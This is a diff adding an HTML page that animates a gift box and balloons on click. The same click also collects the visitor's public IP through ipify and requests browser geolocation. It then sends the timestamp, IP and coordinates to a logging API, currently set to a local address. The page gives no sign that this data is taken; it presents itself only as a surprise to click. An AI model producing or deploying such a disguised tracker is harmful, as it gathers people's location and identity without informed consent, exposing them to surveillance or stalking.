@@ -1,0 +1,202 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Gift Box Surprise</title>
+<style>
+  body {
+    display: flex;
+    height: 100vh;
+    justify-content: center;
+    align-items: center;
+    background: #f0f8ff;
+  }
+
+  #gift-container {
+    position: relative;
+    cursor: pointer;
+  }
+
+  #gift-box {
+    width: 150px;
+    height: 150px;
+    background: red;
+    border: 5px solid #fff;
+    border-radius: 15px;
+    box-shadow: 0 4px 10px rgba(0,0,0,0.2);
+    position: relative;
+    transition: transform 0.5s ease;
+  }
+
+  /* Lid */
+  #gift-box::before {
+    content: '';
+    position: absolute;
+    top: 0;
+    left: 0;
+    width: 150px;
+    height: 50px;
+    background: darkred;
+    border-radius: 15px 15px 0 0;
+    transform-origin: bottom center;
+    transition: transform 0.5s ease;
+    z-index: 2;
+  }
+
+  /* Open state lid rotated up */
+  #gift-box.open::before {
+    transform: rotateX(60deg);
+  }
+
+  /* Balloons container */
+  #balloons {
+    position: absolute;
+    bottom: 160px;
+    left: 50%;
+    transform: translateX(-50%);
+    pointer-events: none;
+  }
+
+  .balloon {
+    position: absolute;
+    bottom: 0;
+    width: 40px;
+    height: 60px;
+    background: radial-gradient(circle at 30% 30%, #ff4b4b, #b22222);
+    border-radius: 50% 50% 50% 50% / 60% 60% 40% 40%;
+    opacity: 0;
+    animation: floatUp 3s ease forwards;
+  }
+
+  .balloon:nth-child(2) {
+    left: -50px;
+    background: radial-gradient(circle at 30% 30%, #4b9aff, #003f87);
+    animation-delay: 0.2s;
+  }
+
+  .balloon:nth-child(3) {
+    left: 0;
+    background: radial-gradient(circle at 30% 30%, #4bff7b, #007a39);
+    animation-delay: 0.4s;
+  }
+
+  .balloon:nth-child(4) {
+    left: 50px;
+    background: radial-gradient(circle at 30% 30%, #ffff4b, #b2b200);
+    animation-delay: 0.6s;
+  }
+
+  @keyframes floatUp {
+    0% {
+      bottom: 0;
+      opacity: 0;
+      transform: translateY(0) scale(0.6);
+    }
+    30% {
+      opacity: 1;
+      transform: translateY(-20px) scale(1);
+    }
+    100% {
+      bottom: 300px;
+      opacity: 0;
+      transform: translateY(-100px) scale(1.2);
+    }
+  }
+</style>
+</head>
+<body>
+
+<div id="gift-container" title="Click me!">
+  <div id="gift-box"></div>
+  <div id="balloons">
+    <div class="balloon"></div>
+    <div class="balloon"></div>
+    <div class="balloon"></div>
+    <div class="balloon"></div>
+  </div>
+</div>
+
+<script>
+  const giftBox = document.getElementById('gift-box');
+  const balloons = document.getElementById('balloons');
+
+  // Hide balloons initially
+  balloons.style.pointerEvents = 'none';
+
+  // Function to get visitor IP via a public API (since JS can't get IP directly)
+  async function getVisitorIP() {
+    try {
+      // Use a free IP API service
+      const res = await fetch('https://api.ipify.org?format=json');
+      const data = await res.json();
+      return data.ip || 'Unknown';
+    } catch {
+      return 'Unknown';
+    }
+  }
+
+  // Function to call your loginfo API
+  async function callLogAPI(logData) {
+    try {
+      await fetch('http://localhost:8000/api/log/loginfo', {  // Adjust API URL as needed
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(logData)
+      });
+      console.log('Log info sent:', logData);
+    } catch (e) {
+      console.error('Failed to send log info:', e);
+    }
+  }
+
+  giftBox.addEventListener('click', async () => {
+    if (giftBox.classList.contains('open')) return; // Prevent multiple clicks
+    giftBox.classList.add('open');
+
+    // Show balloons by triggering animation
+    balloons.querySelectorAll('.balloon').forEach(b => {
+      // Restart animation
+      b.style.animation = 'none';
+      b.offsetHeight; // trigger reflow
+      b.style.animation = null;
+    });
+
+    // Get current date/time
+    const logDate = new Date().toISOString();
+
+    // Try to get geolocation (if user allows)
+    function getPosition() {
+      return new Promise((resolve) => {
+        if (!navigator.geolocation) return resolve(null);
+        navigator.geolocation.getCurrentPosition(
+          pos => resolve({
+            latitude: pos.coords.latitude,
+            longitude: pos.coords.longitude
+          }),
+          () => resolve(null),
+          {timeout: 5000}
+        );
+      });
+    }
+
+    const [ip, position] = await Promise.all([getVisitorIP(), getPosition()]);
+
+    // Compose log data to send
+    const logData = {
+      logDate,
+      ipAddress: ip,
+      location: position ? {
+        latitude: position.latitude,
+        longitude: position.longitude
+      } : null
+    };
+
+    // Call the API with collected info
+    callLogAPI(logData);
+  });
+</script>
+
+</body>
+</html>
+
